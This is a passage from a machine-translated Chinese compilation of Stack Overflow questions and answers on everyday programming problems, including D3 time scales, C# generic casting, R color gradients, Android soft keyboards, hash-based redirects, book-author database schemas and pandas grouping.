我认为这是因为`pnlQ11`是另一个`UserControl`（我猜你正在使用 Windows 窗体），并且根据 MSDN，一个控件只能分配给一个`Control.ControlCollection`（[http://msdn.microsoft.com/en-us/library/system .windows.forms.control.controlcollection.add%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.controlcollection.add%28v=vs.100%29.aspx)）。

因此，您`RadioButton`从 中删除`GroupBox`并添加到`pnlQ11`，这是所有其他`RadioButton`s 所属的同一控件。然后，解决方案是避免`RadioButton`将`GroupBox`

# javascript - 缩放 d3 时间轴的更好方法

> ID：13353188
> 
> 赞同：1
> 
> 时间：2012-11-12T23:14:28.643
> 
> 标签：javascript, d3.js

我正在尝试使用 D3.js 画一条线。它们是在一段时间内间隔采集的样本。我想用 x 的时间轴来绘制它们。每个数据点只是数组中的一个索引，我不知道如何设置我的轴​​，这样我就不必在调用 d3.time.scale 之前手动重新缩放轴。

有谁知道如何清理秤？

从我的代码中摘录。我的实际代码会下载数据并在不同的时间段内绘制很多线，并在图中转换不同的偏移量。

```
// input data
var start_time = 1352684763;
var end_time = 1352771163;
// data is exactly 100 samples taken between start_time and end_time
var data = [140,141,140,140,139,140,140,140,140,141,139,140,54,0,0,0,0,0,0,0,0,0...]
var y_max = d3.max(data);

// graph
var scale_x = d3.time.scale().domain([start_time, end_time]).range([0, 100]);
var scale_y = d3.scale.linear().domain([0, y_max]).range([height, 0]);
var step = (end_time - start_time)/100;
function re_scale(x) { return start_time + x*step; }

// for x, rescale i (0..99) into a timestamp between start_time and end_time before returning it and letting scale_x scale it to a local position. Awkward.
var line = d3.svg.line()
    .x(function(d, i) { return scale_x(re_scale(i)); })
    .y(scale_y)
    .interpolate('basis')

var g = graph.selectAll("g")
    .append('svg:path')
    .attr('d', function(d) { return line(data); })

// also draw axis here... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:30:14.650

“域”应指数据中的跨度，“范围”应指屏幕上的跨度。

目前它将`.range([0, 100])`在 scale_x 上解释为多个像素。如果您将其更改为`.range([0, width])`它应该可以工作而无需重新缩放。

d3.time.scale() 只需要知道起点和终点就可以产生一个好的轴。但是，如果您确实想要为每个数据点打勾，则可以在[docs](https://github.com/mbostock/d3/wiki/Time-Scales#wiki-ticks)中执行此操作。

# c# - 在泛型集合之间转换

> ID：13353194
> 
> 赞同：4
> 
> 时间：2012-11-12T23:15:02.120
> 
> 标签：c#, generics, collections

在以下示例中，鉴于编译器知道 a是 a ，为什么我不能`collectionA`转换为？`collectionB``TItem``A<T>`

```
public class A<T>
{
}

public void Foo<TItem, T> () where TItem : A<T>
{
    var collectionA = new List<TItem>();
    var collectionB = (List<A<T>>)collectionA; // "Cannot cast" error here
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:30:49.387

问题是它允许您将不适当的项目放入collectionA。

这是对它的简化改造，希望它可以更容易地看到问题：

假设您有（伪代码）：

```
class Animal {...}

class Dog: Animal { Bark(){} }

class Cat: Animal { Meow(){} } 
```

现在想象你可以这样做：

```
var dogs = new List<Dog>();

dogs.Add(new Dog());

dogs[0].Bark();

var animals = (List<Animal>) dogs; 
```

然后你就可以做到这一点：

```
animals.Add(new Animal()); // Adds an Animal to the list 'dogs', which 'animals' references.

dogs[1].Bark(); // dogs will now have two elements, but the second isn't a dog -
                // so calling Bark() will explode. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:20:59.007

我相信这是因为您正在指示系统从 to 转换`List<X>`，`List<Y>`而不是说您要将列表中的每个项目从`X`to 转换为`Y`。

你可以这样做：

```
public class A<T>
{
}

public void Foo<TItem, T>() where TItem : A<T>
{
    var collectionA = new List<TItem>();
    var collectionB = new List<A<T>>(collectionA.ToArray()); 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:34:38.623

你想使用

```
var collectionB = collectionA.OfType<List<A<T>>>(); 
```

或者

```
var collectionB = collectionA.Cast<List<A<T>>>(); 
```

第一个将忽略任何非类型`List<A<T>>`且不能被视为类型的内容。如果列表中有无法转换的内容，第二个将引发异常。

# drop-down-menu - 从下拉列表中调用颜色框

> ID：13353201
> 
> 赞同：-2
> 
> 时间：2012-11-12T23:15:36.173
> 
> 标签：drop-down-menu, colorbox

我正在尝试从下拉菜单中调用颜色框项目。使用这个例子，[http://www.jacklmoore.com/colorbox/example4/](http://www.jacklmoore.com/colorbox/example4/)，我怎么能简单地从下拉菜单中调用这些链接？它似乎在除 IE 之外的所有浏览器中都能正常工作，无需任何额外的脚本。我敢肯定，对于任何具有真正编码技能的人来说，这将是一个简单的解决方案。谁能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T17:02:27.057

我在快速谷歌搜索后发现了类似的东西

我不能说这是否有效，但你为什么不试一试将这段代码放入你的 jsfiddle 中，我会看看我是否可以帮助你调试出现的任何问题。

来自：[https ://groups.google.com/forum/?fromgroups=#!topic/colorbox/OM85IPMoyP4](https://groups.google.com/forum/?fromgroups=#!topic/colorbox/OM85IPMoyP4)

```
<select name="howheard" id="howheard" class="validate[required]"> 
  <option value="http://example1.com">Example 1</option> 
  <option value="http://example2.com">Example 2</option> 
  <option value="http://example3.com">Example 3</option> 
</select> 
```

**编辑：更新 colorbox() 初始化：**

```
<script> 
   $(document).ready(function(){ 
      $("#howheard").change(function () { 
          var thisHref = $(this).val();
          $.colorbox({iframe:true, width:"80%", height:"80%", href: thisHref}); 
      }); 
   }); 
</script> 
```

# php - 如何解决类似页面的重复页面内容问题

> ID：13353206
> 
> 赞同：0
> 
> 时间：2012-11-12T23:15:58.043
> 
> 标签：php, wordpress, seo

我正在使用wordpress。因为我需要显示 10 个不同位置的位置页面。

所以我为此创建了一个主题。

在那个侧边栏中，有 10 个位置的垂直菜单。然后那个位置的地图就在那里。在右侧，该位置的地址在那里。每个页面都有不同的页面标题。

根据 url 中的位置名称，我的代码正在获取该位置的地址和名称，然后我将显示它。

我正在使用 SEOmoz 进行 SEO。因此，它显示所有这 10 个页面都具有重复的页面内容。那么如何解决这个错误呢？

页面结构如下。

```
<script src="http://maps.google.com/maps/api/js?sensor=false" type="text/javascript"></script>
<div class="wrapperDiv">
<div class="bg">
<aside>
<h2>Locations</h2>
            <span>
                <ul class="matt">
                    <li <?php if(is_page('Locations')) echo 'class="current_page_item"'; ?>><a href="/locations/">Overview</a></li>
                    <?php $args = array(
                        'depth'        => 1,
                        'show_date'    => '',
                        'date_format'  => get_option('date_format'),
                        'child_of'     => 19,
                        'exclude'      => '',
                        'include'      => '',
                        'title_li'     => '',
                        'echo'         => 1,
                        'authors'      => '',
                        'sort_column'  => 'menu_order, post_title',
                        'link_before'  => '',
                        'link_after'   => '',
                        'walker'       => '',
                        'post_status'  => 'publish' 
                    ); 

                    wp_list_pages( $args );
                    ?>
                </ul>
            </span>
        </aside>
        <article class="locations">
            <div id="smallnav">
             <?php the_breadcrumb(); ?>
            </div>
            <h2>Location : <?php echo $p->name;?></h2>
            <div class="entry-content-locations">
            <?php
    echo '<div id="map"><div id="mapss" style="height:100%; width:100%; float:left;"> </div></div>';

            ?>
                <div id="spanLocs" class="spanLoc"></div>                               
            </div><!-- .entry-content -->           
            </div>          
        </article>                     
        </div>
</div>
</div>
  <script type="text/javascript">
    // Code for google map + Code to fill address in spanLoc  
</script>
<?php get_footer(); ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T02:59:27.617

您有两个多余的结束 div 标签（最后一个）。尝试删除它们，看看会发生什么。像这样的东西：

```
....
<div id="spanLocs" class="spanLoc"></div>
</div>
<!-- .entry-content -->
</div>
</article>
</div>

<script type="text/javascript">
// Code for google map + Code to fill address in spanLoc  
</script>
<?php get_footer(); ?> 
```

# c# - 从后台线程刷新 C# DataGrid

> ID：13353211
> 
> 赞同：0
> 
> 时间：2012-11-12T23:16:44.520
> 
> 标签：c#, wpf, user-interface

我使用`DataGrid`绑定到`ObservableCollection`源来显示两列，一个文件名和一个从分析文件中获得的数字。

```
 ObservableCollection<SearchFile> fileso;

    //...

    private void worker_DoWork(object sender, DoWorkEventArgs e)
    {
        /* Get all the files to check. */
        int dirCount = searchFoldersListView.Items.Count;
        List<string> allFiles = new List<string>();
        for(int i = 0; i < dirCount; i++)
        {
            try
            {
                allFiles.AddRange(Directory.GetFiles(searchFoldersListView.Items[i].ToString(), "*.txt").ToList());
                allFiles.AddRange(Directory.GetFiles(searchFoldersListView.Items[i].ToString(), "*.pdf").ToList());
            }
            catch
            { /* stuff */ }
        }

        /* Clear the collection and populate it with unchecked files again, refreshing the grid. */
        this.Dispatcher.Invoke(new Action(delegate
        {
            fileso.Clear();
            foreach(var file in allFiles)
            {
                SearchFile sf = new SearchFile() { path=file, occurrences=0 };
                fileso.Add(sf);
            }
        }));

        /* Check the files. */
        foreach(var file in allFiles)
        {
            this.Dispatcher.Invoke(new Action(delegate
            {
                int occurences;
                bool result = FileSearcher.searchFile(file, searchTermTextBox.Text, out occurences);

                fileso.AddOccurrences(file, occurences);  // This is an extension method that alters the collection by finding the relevant item and changing it.
            }));
        }
    }

    //...

    public static void AddOccurrences(this ObservableCollection<SearchFile> collection, string path, int occurrences)
    {
        for(int i = 0; i < collection.Count; i++)
        {
            if(collection[i].path == path)
            {
                collection[i].occurrences = occurrences;
                break;
            }
        }
    }

    //...

    public static bool searchTxtFile(string path, string term, out int occurences)
    {
        string contents = File.ReadAllText(path);
        occurences = Regex.Matches(contents, term, RegexOptions.IgnoreCase).Count;
        if(occurences>0)
            return true;
        return false;
    }

    public static bool searchDocxFile(string path, string term, out int occurences)
    {
        occurences = 0;

        string tempPath = Path.GetTempPath();
        string rawName = Path.GetFileNameWithoutExtension(path);
        string destFile = System.IO.Path.Combine(tempPath, rawName + ".zip");
        System.IO.File.Copy(path, destFile, true);

        using(ZipFile zf = new ZipFile(destFile))
        {
            ZipEntry ze = zf.GetEntry("word/document.xml");
            if(ze != null)
            {
                using(Stream zipstream = zf.GetInputStream(ze))
                {
                    using(StreamReader sr = new StreamReader(zipstream))
                    {
                        string docContents = sr.ReadToEnd();
                        string rawText = Extensions.StripTagsRegexCompiled(docContents);
                        occurences = Regex.Matches(rawText, term, RegexOptions.IgnoreCase).Count;
                        if(occurences>0)
                            return true;
                        return false;
                    }
                }
            }
        }
        return false;
    }

    public static bool searchFile(string path, string term, out int occurences)
    {
        occurences = 0;
        string ext = System.IO.Path.GetExtension(path);

        switch(ext)
        {
            case ".txt":
                return searchTxtFile(path, term, out occurences);
            //case ".doc":
            //    return searchDocFile(path, term, out occurences);
            case ".docx":
                return searchDocxFile(path, term, out occurences);
        }
        return false;
    } 
```

但问题是，有时，当我点击更新按钮（使用上面的 do_work 方法启动工作人员）时，有时，我在数字列中得到随机零而不是正确的数字。这是为什么？我假设这是因为两次更新数字列存在一些问题，有时在实际更新后应用第一次归零，但我不确定细节。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:11:36.993

我认为这是[访问修改后的闭包的情况](https://stackoverflow.com/questions/235455/access-to-modified-closure)

```
 /* Check the files. */
        foreach(var file in allFiles)
        {
            var fileTmp = file; // avoid access to modified closure
            this.Dispatcher.Invoke(new Action(delegate
            {
                int occurences;
                bool result = FileSearcher.searchFile(fileTmp, searchTermTextBox.Text, out occurences);

                fileso.AddOccurrences(fileTmp, occurences);  // This is an extension method that alters the collection by finding the relevant item and changing it.
            }));
        } 
```

基本上发生的事情是您将文件变量传递给 lambda 表达式，但是在实际调用操作之前，foreach 循环将修改文件，使用临时变量来保存文件应该可以解决这个问题。

# r - 从颜色 1 到颜色 2 的 n 种颜色的渐变

> ID：13353213
> 
> 赞同：120
> 
> 时间：2012-11-12T23:16:53.253
> 
> 标签：r, gradient

我经常使用`ggplot2`它使渐变变得很好（[单击此处查看示例](http://www.r-bloggers.com/ggtutorial-day-5-gradient-colors-and-brewer-palettes/)）。我需要在基础上工作，我认为`scales`也可以在那里使用来创建颜色渐变，但我对如何操作非常不满意。基本目标是生成从 x 颜色到 y 颜色的 n 种颜色的调色板。该解决方案需要在基础上工作。这是一个起点，但没有地方可以输入 n。

```
 scale_colour_gradientn(colours=c("red", "blue")) 
```

我很清楚：

```
brewer.pal(8, "Spectral") 
```

从`RColorBrewer`. 我正在寻找更多类似于如何`ggplot2`处理渐变的方法，即我有这两种颜色并且我想要15种颜色。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：198
> 
> 时间：2012-11-12T23:21:54.087

`colorRampPalette`可能是你的朋友：

```
colfunc <- colorRampPalette(c("black", "white"))
colfunc(10)
# [1] "#000000" "#1C1C1C" "#383838" "#555555" "#717171" "#8D8D8D" "#AAAAAA"
# [8] "#C6C6C6" "#E2E2E2" "#FFFFFF" 
```

只是为了证明它有效：

```
plot(rep(1,10),col=colfunc(10),pch=19,cex=3) 
```

![在此处输入图像描述](../Images/164887d75a1504a58210f3aa8183ad77.png)

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2015-05-29T15:41:17.897

只是扩展上一个答案`colorRampPalette`可以处理两种以上的颜色。

因此，对于更扩展的“热图”类型，您可以....

```
colfunc<-colorRampPalette(c("red","yellow","springgreen","royalblue"))
plot(rep(1,50),col=(colfunc(50)), pch=19,cex=2) 
```

结果图像：

![在此处输入图像描述](../Images/aab1a316d0a756cc6ef3dbdbfc0da997.png)

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2016-02-26T16:04:10.147

尝试以下操作：

```
color.gradient <- function(x, colors=c("red","yellow","green"), colsteps=100) {
  return( colorRampPalette(colors) (colsteps) [ findInterval(x, seq(min(x),max(x), length.out=colsteps)) ] )
}
x <- c((1:100)^2, (100:1)^2)
plot(x,col=color.gradient(x), pch=19,cex=2) 
```

[![在此处输入图像描述](../Images/600430fe4859200c0f55368a7151124b.png)](https://i.stack.imgur.com/9HJJN.png)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2014-09-24T11:30:51.070

上面的答案很有用，但在图表中，很难区分较暗的黑色渐变。我发现的一种替代方法是使用灰色渐变，如下所示

```
palette(gray.colors(10, 0.9, 0.4))
plot(rep(1,10),col=1:10,pch=19,cex=3)) 
```

更多关于灰度的信息在[这里。](http://stat.ethz.ch/R-manual/R-devel/library/grDevices/html/gray.colors.html)

**添加**

当我将上面的代码用于蓝色和黑色等不同颜色时，渐变不是那么清晰。 `heat.colors()`似乎更有用。

[本文档](http://web.archive.org/web/20141111182737/http://www.stat.tamu.edu/~jkim/Rcolorstyle.pdf)包含更详细的信息和选项。[pdf](http://web.archive.org/web/20141111182737/http://www.stat.tamu.edu/~jkim/Rcolorstyle.pdf)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-09T16:44:13.300

另一种方法（不一定比以前的答案更好！）是使用`viridis`包。正如[这里](https://cran.r-project.org/web/packages/viridis/vignettes/intro-to-viridis.html)所解释的，它允许基于两种以上颜色的各种颜色渐变。

该软件包非常易于使用 - 您只需将`ggplot2`比例填充功能（例如，`scale_fill_gradient(low = "skyblue", high = "dodgerblue4")`）替换为等效`viridis`功能。

因此，更改此图的代码：

```
ggplot(mtcars, aes(wt*1000, mpg)) +
  geom_point(size = 4, aes(colour = hp)) +
  xlab("Weight (pounds)") + ylab("Miles per gallon (MPG)") + labs(color='Horse power') +
  scale_x_continuous(limits = c(1000, 6000), 
                     breaks = c(seq(1000,6000,1000)), 
                     labels = c("1,000", "2,000", "3,000", "4,000", "5,000", "6,000")) + 
  scale_fill_gradient(low = "skyblue", high = "dodgerblue4") +
  theme_classic() 
```

产生：

[![在此处输入图像描述](../Images/c2b22cc8b031202e4fb7177f74c32366.png)](https://i.stack.imgur.com/HnREA.jpg)

为此，它使用`viridis`：

```
ggplot(mtcars, aes(wt*1000, mpg)) +
  geom_point(size = 4, aes(colour = factor(cyl))) +
  xlab("Weight (pounds)") + ylab("Miles per gallon (MPG)") + labs(color='Number\nof cylinders') +
  scale_x_continuous(limits = c(1000, 6000), 
                     breaks = c(seq(1000,6000,1000)), 
                     labels = c("1,000", "2,000", "3,000", "4,000", "5,000", "6,000")) + 
  scale_color_viridis(discrete = TRUE) +
  theme_classic() 
```

唯一的区别在于倒数第二行：`scale_color_viridis(discrete = TRUE)`.

这是使用产生的情节`viridis`：

[![在此处输入图像描述](../Images/199bb812a3573ef93bdd9f3d0eb395a6.png)](https://i.stack.imgur.com/md2Lv.jpg)

希望有人觉得这很有用，因为它是我在提出这个问题后最终使用的解决方案。

# python - Sockjs-tornado 和 rpc

> ID：13353214
> 
> 赞同：2
> 
> 时间：2012-11-12T23:16:54.453
> 
> 标签：python, rpc, tornado, msgpack, sockjs

我正在尝试将 sockjs-tornado 服务器添加到我的站点，并且一切正常，直到我决定通过 MsgPack（使用 msgpack-rpc-python）将它连接到我的其他应用程序。现在可以使用 sockjs 服务器或者 RPC 服务器。取决于它们中的哪一个首先开始循环。

我认为我需要为他们两个使用一个 tornado.ioloop。但不知道如何实现。或者可能有另一种方法将 rpc 添加到龙卷风服务器？

这是带有 msgpack-rpc-python 的 sockjs-tornado 示例代码：

```
import tornado.ioloop
import tornado.web

import sockjs.tornado

import msgpackrpc

class RPCServer(object):
    def sum(self, x, y):
        return x + y

class IndexHandler(tornado.web.RequestHandler):
    """Regular HTTP handler to serve the chatroom page"""
    def get(self):
        self.render('index.html')

class ChatConnection(sockjs.tornado.SockJSConnection):
    """Chat connection implementation"""
    # Class level variable
    participants = set()

    def on_open(self, info):
        # Send that someone joined
        self.broadcast(self.participants, "Someone joined.")
        # Add client to the clients list
        self.participants.add(self)

    def on_message(self, message):
        # Broadcast message
        self.broadcast(self.participants, message)

    def on_close(self):
        # Remove client from the clients list and broadcast leave message
        self.participants.remove(self)
        self.broadcast(self.participants, "Someone left.")

if __name__ == "__main__":
    # 1\. Create chat router
    ChatRouter = sockjs.tornado.SockJSRouter(ChatConnection, '/chat')

    # 1.5 Create MsgPack RPC Server
    rpc = msgpackrpc.Server(RPCServer())

    # 2\. Create Tornado application
    app = tornado.web.Application(
            [(r"/", IndexHandler)] + ChatRouter.urls
    )

    # 3\. Make Tornado app listen on port 5000
    app.listen(5000)

    # 3.5 Make MsgPack RPC Server listen on port 5001
    rpc.listen(msgpackrpc.Address('localhost', 5001))

    # 4\. Start IOLoop
    tornado.ioloop.IOLoop.instance().start()

    # 5\. Never executed 
    rpc.start() 
```

`

欢迎任何建议或示例！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:27:31.177

发生这种情况是因为两个`start()`调用都启动 Tornado IOLoop 并且在 IOLoop 停止之前它们不会退出。

是的，您必须使用一个 IOLoop。作为`msgpackrpc.Server`接受`Loop`类实例并`Loop`封装`IOLoop`，试试这个：

```
if __name__ == '__main__':
    io_loop = tornado.ioloop.IOLoop.instance()

    loop = msgpackrpc.Loop(io_loop)
    rpc = msgpackrpc.Server(RPCServer(), loop=loop)

    # ... sockjs-tornado initialisation. No need to call rpc.start()

    io_loop.start() 
```

# wordpress - WordPress中的复杂业务逻辑

> ID：13353223
> 
> 赞同：-1
> 
> 时间：2012-11-12T23:17:44.367
> 
> 标签：wordpress, java-ee-6

问题：从编程的角度来看，WordPress 是否允许我通过编写自己的 Java EE 系统获得类似的灵活性？例如，如果网站所有者突然决定必须向生日在星期三的用户发送通知电子邮件，并且必须将他们的生日事件输入到日历中，然后网站的其他成员可以回复并随后给出星级评分说他们有多喜欢它……我可以用 WP 轻松做到这一点吗？

希望这很清楚，非常欢迎任何反馈。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:30:36.510

Wordpress 上手比较容易，你可以轻松安装任何你想要的插件。它的唯一问题是它很像 Windows：它占了许多人的用例。

对于您来说，考虑到企业/企业（您在编辑问题之前提到了企业应用程序）/可扩展平台，我建议您坚持使用您所拥有的。您自己（或作为一个团队）编写了它，因此您了解它的所有内容，以及当出现错误时要查找的内容。它可以使用您自己的代码轻松扩展，您无需整理和学习一门新语言。

Wordpress 非常适合博客，因为这就是它的设计目的。它适用于具有动态布局但内容相对静态的通用网站（博客文章，写一次，编辑几次，但相对静态）。当然，您可以为它编写插件，并且已经编写了许多插件，但是如果没有主要扩展，它几乎没有您似乎需要的功能。

此外，它是用 PHP 编写的，它必须被解释，而不是 java，它是一个半编译/优化的字节码（有点复杂），但 java 比等效的 PHP 代码运行得更快。

所以你的系统的好处：

*   快点
*   更可靠
*   适用于非常动态的内容

WordPress的好处：

*   更容易扩展
*   适用于静态内容
*   新手使用更容易（但您自己的界面可能工作得很好）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:21:02.513

WordPress 非常灵活，毫无疑问，它可以成为您应用程序的可行框架。你一定要检查一下。

也就是说，如果您要构建如此复杂的东西，我会选择您所知道的。在最初的几个 WP 项目中，你会犯错误并以奇怪的方式做事。

# java - 为什么 showSoftInput 不显示虚拟键盘？

> ID：13353224
> 
> 赞同：4
> 
> 时间：2012-11-12T23:17:55.040
> 
> 标签：java, android, virtual-keyboard

本质上，我试图在不使用可见`EditText`或`TextView`. 我意识到`toggleSoftInput`可以用来执行此操作，但是我需要使用它`showSoftInput`，因为我想使用 a`TextWatcher`来操作输入。此外，我使用的引擎是 c++，所以我尝试尽可能少地编写纯 java 代码，因此我避免使用 .xml 文件。所以这里...

```
public class GameActivity extends Activity {

    protected GameView view = null;
    protected EditText editText;

    protected void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);

        view = new GameView(this);
        setContentView(view);

        editText = new EditText(this);
        editText.setCursorVisible(false);
        editText.setFocusable(true);
        editText.setFocusableInTouchMode(true);
    }

    public boolean showKeyboard()
    {
        JniApp.log("showKeyboard() in Java invoked!!!");

        editText.requestFocus();
        editText.requestFocusFromTouch();

        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
        imm.showSoftInput(editText, InputMethodManager.SHOW_FORCED);
    } 
```

`showKeyboard()`我对 java 的 c++ 调用在哪里？我已经检查以确保它`editText`正在接收焦点，并且确实如此。但是，`showSoftInput`返回 false。任何帮助将不胜感激。

更新：经过一些调试后，它看起来好像`requestFocus`返回 true，但活动仍然说`view`是当前焦点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-03T20:33:58.423

也许用 .SHOW_IMPLICIT 而不是 .SHOW_FORCED 试试？

您是否在其他可能具有其他 Android 版本的模拟器/设备上尝试过它？

# javascript - 如果包含 #NOTECHWORKING 则重定向 url

> ID：13353225
> 
> 赞同：3
> 
> 时间：2012-11-12T23:18:10.987
> 
> 标签：javascript, .htaccess

我已经搜索了大约一个星期，但仍然找不到我的问题的答案，所以我终于停下来问这里！我要完成的是仅当 URL 最后包含 #NOTECHWORKING 时才重定向 URL。注意#。我已经尝试过简单的重定向，但包含的 # 没有任何效果。

这是我没有成功的尝试：

```
RewriteCond %{REQUEST_FILENAME} #NOTECHWORKING  
RewriteRule ^.*$ http://www.mydomain.com/chatclosed.html [L] 
```

这：

```
RewriteCond %{REQUEST_URI} #NOTECHWORKING 
RewriteRule ^.*$ http://www.mydomain.com/chatclosed.html [L] 
```

并且：

```
RewriteCond %{QUERY_STRING} #NOTECHWORKING 
RewriteRule ^.*$ http://www.mydomain.com/chatclosed.html [L] 
```

如果这需要在 Javascript 中完成，我将不知道如何做到这一点！

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:24:02.043

浏览器通常不会将#fragments 发送到服务器，因此您的重写条件永远不会被触发

您可以通过检查 window.location.hash 属性的值来使用 Javascript 实现类似的效果

```
if(window.location.hash == "#NOTECHWORKING") {
    window.location.href = '/newurl.html';
} 
```

但是，这仅适用于浏览器，因此搜索引擎将无法跟踪您的重定向。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:30:20.707

它可以通过使用 JavaScript 来完成。使用后退/下一步按钮应用命令：

```
window.onhashchange = function() {
    var h=window.location.hash;
    if(h.substr(1) == 'NOTECHWORKING') window.location.replace("http://www.mydomain.com/chatclosed.html");
}; 
```

# mysql - 如何在简单的书籍表中写入数据库多个作者？

> ID：13353231
> 
> 赞同：7
> 
> 时间：2012-11-12T23:18:45.997
> 
> 标签：mysql, database

我想知道如何将作者（如果有多个作者）保存在简单的数据库中。

如果一本书有一个作者，一切都很容易。问题是当我想拥有表**Books**并希望有可能与表**Authors**进行简单的选择和连接时：

**图书**

```
| id  | Title | ISBN | Authors? | 
---------------------------------
|     |       |      |          |
|     |       |      |          | 
```

**作者**

```
| id  | Firs Name | Last Name | Short Name | Pseudonym | 
--------------------------------------------------------
|     |           |           |            |           |
|     |           |           |            |           | 
```

我知道我可以使用具有相同 ISBN 和 TITLE 的单独行，但是我想知道如果标题有时非常大（255 长度的 UTF 字符串/varchar/char）是个好主意。

我知道这可能是非常基本的问题，很抱歉我不得不问这个问题:(

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T23:31:31.943

摆脱. `authors`_`books`

书籍和作者之间存在多对多关系：有些书籍有多个作者，有些作者写了不止一本书。而且，书籍有第一、第二和第三作者，依此类推。您无法以某种不可预测的顺序呈现一本书的作者姓名。作者和出版商决定作者顺序，而不是 dbms 程序员。

因此，您需要一个`books_authors`包含以下列的表格

```
 book_id
  author_id
  author_ordinal   (a number like 1,2,3 to denote the order of authors) 
```

您可以使用以下查询获取特定书籍的作者列表：

```
 SELECT isbn, title, author_ordinal, first, last
   FROM books b
   LEFT JOIN books_authors ba ON (b.id = ba.book_id)
   LEFT JOIN authors a ON (ba.author_id = a.id)
  WHERE isbn = '978whatever'
  ORDER BY author_ordinal 
```

`role`如果您想使您的软件在书目上完整，那么在您的 books_authors 表中放置一个名为的文本字段也是明智的。人们在书籍创作中扮演着不同的角色，例如“作者”、“插画家”、“编辑”、“系列编辑”、“撰稿人”、“序言作者”等等。该`role`列将让您捕获该信息。

顺便说一句，如果您始终一致地命名您的 id 列，大多数 dbms 逆向工程工具会更快乐。所以你应该使用books.book_id 和authors.author_id 而不仅仅是books.id 和authors.id。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-12T23:26:54.093

由于一本书可以有多个作者，并且一个作者可以写不止一本书，我建议在 Books 和 Authors 表之间建立多对多的关系。

添加另一个链接两者的表，如下所示：

**图书作者**

| 书号 | 作者ID |

BookID 是 Books.id 的外键，AuthorID 是 Authors.id 的外键。

如果您想返回给定书籍的所有作者，您可以执行以下操作：

```
SELECT Authors.id, Authors.FirstName, Authors.LastName
FROM Authors INNER JOIN BookAuthors ON Authors.id = BookAuthors.AuthorID
WHERE BookAuthors.BookID = '123' 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-12T23:28:24.027

你有两种真正的可能性：

*   每本书有许多作者，但每个作者最多只能拥有一本书（极不可能） - 这样，您将在 Author 表中放置一个*外键*，将该作者链接到该书。您可以有两个这样的作者具有相同的图书 ID，但这意味着您不必复制图书详细信息，或者实际上，除了图书 ID 之外的任何内容
*   更有可能：每本书有很多作者，每个作者有很多书。这称为“多对多关系”，需要您添加另一个表。

所以，让我们考虑一下：一本书有它的所有细节和一个 ID。每个作者都有许多详细信息和一个 ID。如果您想将作者与一本书相关联，您可以在另一个表中添加一行，比如说“Credits”。

*   每个作者可以有很多学分，但每个学分是针对一个作者的。
*   同样，每本书的封面可以有很多学分，但每个学分都只在那本书上。

这样你就有了两个一对多的关系（从作者到学分，从书到学分），并且可以代表你需要的东西而没有任何尴尬的多值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T23:27:24.787

您需要另一个名为 的表`BookAuthor`，您不需要`Authors`Books 中的列

```
BookAuthor
------------
BookID
AuthorID 
```

BookID 引用 Books 上的 PK (BookID) 和 AuthorID 引用 Authors 上的 PK (AuthorID)

```
Select b.Title, CONCAT(a.[First Name], a.[Last Name]) As AuthorName
From Books b
JOIN BookAuthor ba ON b.ID = ba.BookID
JOIN Authors a ON ba.AuthorID = a.ID 
```

# python - 给定边缘分割 DataFrame 的最佳方法

> ID：13353233
> 
> 赞同：4
> 
> 时间：2012-11-12T23:19:02.507
> 
> 标签：python, pandas

假设我有以下数据框：

```
 a         b
0  A  1.516733
1  A  0.035646
2  A -0.942834
3  B -0.157334
4  A  2.226809
5  A  0.768516
6  B -0.015162
7  A  0.710356
8  A  0.151429 
```

我需要根据“边缘B”对它进行分组；这意味着这些组将是：

```
 a         b
0  A  1.516733
1  A  0.035646
2  A -0.942834
3  B -0.157334

4  A  2.226809
5  A  0.768516
6  B -0.015162

7  A  0.710356
8  A  0.151429 
```

那是。每当我在“a”列中找到“B”时，我都想拆分我的 DataFrame。

我目前的解决方案是：

```
#create the dataframe
s = pd.Series(['A','A','A','B','A','A','B','A','A'])
ss = pd.Series(np.random.randn(9))
dff = pd.DataFrame({"a":s,"b":ss})

#my solution
count  = 0
ls = []
for i in s:
    if i=="A":
        ls.append(count)
    else:
        ls.append(count)
        count+=1
dff['grpb']=ls 
```

我得到了数据框：

```
 a   b           grpb
0   A   1.516733    0
1   A   0.035646    0
2   A   -0.942834   0
3   B   -0.157334   0
4   A   2.226809    1
5   A   0.768516    1
6   B   -0.015162   1
7   A   0.710356    2
8   A   0.151429    2 
```

然后我可以用`dff.groupby('grpb')`.

有没有更有效的方法可以使用 pandas 函数来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T13:43:42.183

这是一个单线：

```
zip(*dff.groupby(pd.rolling_median((1*(dff['a']=='B')).cumsum(),3,True)))[-1]

[   1         2
0  A  1.516733
1  A  0.035646
2  A -0.942834
3  B -0.157334,
    1         2
4  A  2.226809
5  A  0.768516
6  B -0.015162,
    1         2
7  A  0.710356
8  A  0.151429] 
```

* * *

## 回答 #2

